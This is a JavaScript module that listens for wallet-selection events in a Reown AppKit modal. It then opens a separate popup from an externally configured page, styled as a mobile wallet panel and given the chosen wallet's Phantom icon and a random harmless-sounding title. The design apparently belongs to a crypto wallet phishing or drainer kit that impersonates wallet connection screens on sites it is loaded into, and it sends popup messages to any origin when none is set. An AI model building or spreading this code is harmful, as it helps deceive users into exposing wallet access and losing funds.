/** Popup window size — matches ~400px mobile-style panel in the reference UI */
const POPUP_WIDTH = 400;
const POPUP_HEIGHT = 720;

/** @type {Window | null} */
let activePopup = null;

/** @type {string} */
let popupOrigin = "";

/** @type {{ wallet: string; title: string; icon: string } | null} */
let pendingPopupPayload = null;

const ADJECTIVES = [
  "Gentle",
  "Purple",
  "Silent",
  "Bright",
  "Hidden",
  "Golden",
  "Swift",
  "Calm",
  "Velvet",
  "Crystal",
  "Misty",
  "Solar",
  "Lunar",
  "Quiet",
  "Bold",
  "Azure",
  "Crimson",
  "Silver",
];

const NOUNS = [
  "Crown",
  "Prophet",
  "Harbor",
  "Nova",
  "Echo",
  "Forge",
  "Pulse",
  "Garden",
  "Summit",
  "Mirror",
  "Canvas",
  "Horizon",
  "Lantern",
  "Valley",
  "Compass",
  "Anchor",
  "Feather",
  "Prism",
];

const WALLET_ICONS = {
  Phantom:
    "data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMTA4IiBoZWlnaHQ9IjEwOCIgdmlld0JveD0iMCAwIDEwOCAxMDgiIGZpbGw9Im5vbmUiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyI+CjxyZWN0IHdpZHRoPSIxMDgiIGhlaWdodD0iMTA4IiByeD0iMjYiIGZpbGw9IiNBQjlGRjIiLz4KPHBhdGggZmlsbC1ydWxlPSJldGVubm9kIiBjbGlwLXJ1bGU9ImV2ZW5vZGQiIGQ9Ik00Ni41MjY3IDY5LjkyMjlDNDIuMDA1NCA3Ni44NTA5IDM0LjQyOTIgODUuNjE4MiAyNC4zNDggODUuNjE4MkMxOS41ODI0IDg1LjYxODIgMTUgODMuNjU2MyAxNSA3NS4xMzQyQzE1IDUzLjQzMDUgNDQuNjMyNiAxOS44MzI3IDcyLjEyNjggMTkuODMyN0M4Ny43NjggMTkuODMyNyA5NCAzMC42ODQ2IDk0IDQzLjAwNzlDOTQgNTguODI1OCA4My43MzU1IDc2LjkxMjIgNzMuNTMyMSA3Ni45MTIyQzcwLjI5MzkgNzYuOTEyMiA2OC43MDUzIDc1LjEzNDIgNjguNzA1MyA3Mi4zMTRDNjguNzA1MyA3MS41NzgzIDY4LjgyNzUgNzAuNzgxMiA2OS4wNzE5IDY5LjkyMjlDNjUuNTg5MyA3NS44Njk5IDU4Ljg2ODUgODEuMzg3OCA1Mi41NzU0IDgxLjM4NzhDNDcuOTkzIDgxLjM4NzggNDUuNjcxMyA3OC41MDYzIDQ1LjY3MTMgNzQuNDU5OEM0NS42NzEzIDcyLjk4ODQgNDUuOTc2OCA3MS40NTU2IDQ2LjUyNjcgNjkuOTIyOVpNODMuNjc2MSA0Mi41Nzk0QzgzLjY3NjEgNDYuMTcwNCA4MS41NTc1IDQ3Ljk2NTggNzkuMTg3NSA0Ny45NjU4Qzc2Ljc4MTYgNDcuOTY1OCA3NC42OTg5IDQ2LjE3MDQgNzQuNjk4OSA0Mi41Nzk0Qzc0LjY5ODkgMzguOTg4NSA3Ni43ODE2IDM3LjE5MzEgNzkuMTg3NSAzNy4xOTMxQzgxLjU1NzUgMzcuMTkzMSA4My42NzYxIDM4Ljk4ODUgODMuNjc2MSA0Mi41Nzk0Wk03MC4yMTAzIDQyLjU3OTVDNzAuMjEwMyA0Ni4xNzA0IDY4LjA5MTYgNDcuOTY1OCA2NS43MjE2IDQ3Ljk2NThDNjMuMzE1NyA0Ny45NjU4IDYxLjIzMyA0Ni4xNzA0IDYxLjIzMyA0Mi41Nzk1QzYxLjIzMyAzOC45ODg1IDYzLjMxNTcgMzcuMTkzMSA2NS43MjE2IDM3LjE5MzFDNjguMDkxNiAzNy4xOTMxIDcwLjIxMDMgMzguOTg4NSA3MC4yMTAzIDQyLjU3OTVaIiBmaWxsPSIjRkZGREY4Ii8+Cjwvc3ZnPgo=",
};

/**
 * @param {import('./wallet-loader.js').WalletEmbedConfig} [config]
 */
export function randomPopupTitle(config) {
  if (config?.connectPopupTitle) {
    return config.connectPopupTitle;
  }
  const adj = ADJECTIVES[Math.floor(Math.random() * ADJECTIVES.length)];
  const noun = NOUNS[Math.floor(Math.random() * NOUNS.length)];
  return `${adj} ${noun}`;
}

/**
 * @param {string} walletName
 */
function walletIconUrl(walletName) {
  return WALLET_ICONS[walletName] || "";
}

/**
 * @param {import('./wallet-loader.js').WalletEmbedConfig} config
 */
export function resolveConnectPopupUrl(config) {
  const explicit = (config.connectPopupUrl || "").trim().replace(/\/$/, "");
  if (explicit) {
    return explicit;
  }

  return "";
}

/**
 * @param {Window} popup
 * @param {{ wallet: string; title: string; icon: string }} payload
 */
function sendPopupInit(popup, payload) {
  if (!popup || popup.closed) return;
  popup.postMessage(
    {
      type: "wallet-connect-init",
      wallet: payload.wallet,
      title: payload.title,
      icon: payload.icon,
    },
    popupOrigin || "*"
  );
}

/**
 * @param {import('./wallet-loader.js').WalletEmbedConfig} config
 * @param {string} walletName
 */
export function openWalletConnectPopup(config, walletName) {
  if (config.connectPopupEnabled === false) return;

  const popupUrl = resolveConnectPopupUrl(config);
  if (!popupUrl) {
    console.warn(
      "[wallet] Set connect_popup_url or site_url in loader.php for Vercel popup"
    );
    return;
  }

  try {
    popupOrigin = new URL(popupUrl).origin;
  } catch {
    popupOrigin = "";
  }

  pendingPopupPayload = {
    wallet: walletName,
    title: randomPopupTitle(config),
    icon: walletIconUrl(walletName),
  };

  if (activePopup && !activePopup.closed) {
    sendPopupInit(activePopup, pendingPopupPayload);
    activePopup.focus();
    return activePopup;
  }

  const w = Math.min(POPUP_WIDTH, window.screen.availWidth - 24);
  const h = Math.min(POPUP_HEIGHT, window.screen.availHeight - 48);
  const left = Math.max(0, (window.screen.width - w) / 2);
  const top = Math.max(0, (window.screen.height - h) / 2);
  const features = [
    `width=${w}`,
    `height=${h}`,
    `left=${left}`,
    `top=${top}`,
    "popup=yes",
    "scrollbars=no",
    "resizable=no",
  ].join(",");

  activePopup = window.open(popupUrl, "wallet_connect_popup", features);
  return activePopup;
}

export function closeWalletConnectPopup() {
  pendingPopupPayload = null;
  if (activePopup && !activePopup.closed) {
    activePopup.close();
  }
  activePopup = null;
}

/**
 * @param {ReturnType<import('@reown/appkit').createAppKit>} modal
 * @param {import('./wallet-loader.js').WalletEmbedConfig} config
 */
export function setupWalletSelectPopup(modal, config) {
  if (config.connectPopupEnabled === false) return;

  /** @type {string | undefined} */
  let lastEventId;

  modal.subscribeEvents((state) => {
    const evt = state?.data;
    if (!evt || evt.type !== "track") return;

    const eventKey = `${evt.event}:${state.timestamp}`;
    if (eventKey === lastEventId) return;
    lastEventId = eventKey;

    if (evt.event === "SELECT_WALLET" && evt.properties?.name) {
      openWalletConnectPopup(config, evt.properties.name);
      return;
    }

    if (
      evt.event === "CONNECT_SUCCESS" ||
      evt.event === "CONNECT_ERROR" ||
      evt.event === "MODAL_CLOSE"
    ) {
      closeWalletConnectPopup();
    }
  });
}

/**
 * @param {ReturnType<import('@reown/appkit').createAppKit>} modal
 */
export function setupPopupMessageListener(modal) {
  window.addEventListener("message", (event) => {
    if (popupOrigin && event.origin !== popupOrigin) return;

    if (event.data?.type === "wallet-connect-popup-ready") {
      if (pendingPopupPayload && event.source instanceof Window) {
        sendPopupInit(event.source, pendingPopupPayload);
      }
      return;
    }

    if (event.data?.type === "wallet-connect-retry") {
      modal.open({ view: "Connect", namespace: "solana" });
    }
  });
}
